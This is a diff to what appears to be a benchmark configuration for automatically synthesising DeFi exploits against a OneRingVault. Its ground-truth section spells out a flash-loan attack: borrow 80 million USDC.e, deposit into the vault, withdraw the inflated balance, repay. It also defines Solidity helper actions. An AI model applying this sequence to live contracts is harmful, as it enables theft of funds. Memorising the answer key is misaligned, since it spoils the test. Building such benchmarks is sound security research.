@@ -22,10 +22,13 @@ ctrt_name2deploy:
   - ["vault", "new OneRingVault([address(usdce)], address(strategy), totalSupplyvault)"]
 
 extra_actions:
-  - "function transaction_vault_usdce(uint256 amount) internal {
+  - "function deposit_vault_usdce_vault(uint256 amount) internal eurus {
         usdce.approve(address(vault), type(uint256).max);
         vault.depositSafe(amount, address(usdce), 1);
-        vault.withdraw(vault.balanceOf(address(attacker)), address(usdce));
+    }"
+
+  - "function withdraw_vault_vault_usdce(uint256 amount) internal eurus {
+        vault.withdraw(amount, address(usdce));
     }"
 
 extra_deployments:
@@ -36,9 +39,10 @@ extra_statements: []
 attack_goal_str: "usdce;1e6"
 
 groundtruth:
-  - ["borrow", "pair", "usdce", "80000000e6"]
-  - ["transaction", "vault", "usdce", "usdce.balanceOf(attacker)"]
-  - ["payback", "pair", "usdce", "80000000e6 * 1003 / 1000"]
+  - ["borrow", "usdce", "pair", "80000000e6"]
+  - ["deposit", "vault", "usdce", "vault", "80000000e6"]
+  - ["withdraw", "vault", "vault", "usdce", "vault.balanceOf(attacker)"]
+  - ["payback", "usdce", "pair", "80000000e6 * 1003 / 1000"]
 
 # Information for search space building.
 roles:
@@ -52,7 +56,8 @@ roles:
     is_stablecoin: false
   "pair":
     is_swappair: true
-    uniswap_order: ["usdce", "mim"]
+    is_uniswap: true
+    token_pair: ["usdce", "mim"]
     support_swaps:
       "usdce": ["mim", "usdce"]
       "mim": ["mim", "usdce"]
@@ -60,7 +65,11 @@ roles:
     oracle: "pair"
     is_lendpool: true
   "vault":
+    is_asset: true
+    is_erc20: true
     is_defientry: true
     hacked_assets: ["usdce"]
+  "strategy":
+    is_asset: false
 
 pattern: "BuySell Manipulation"
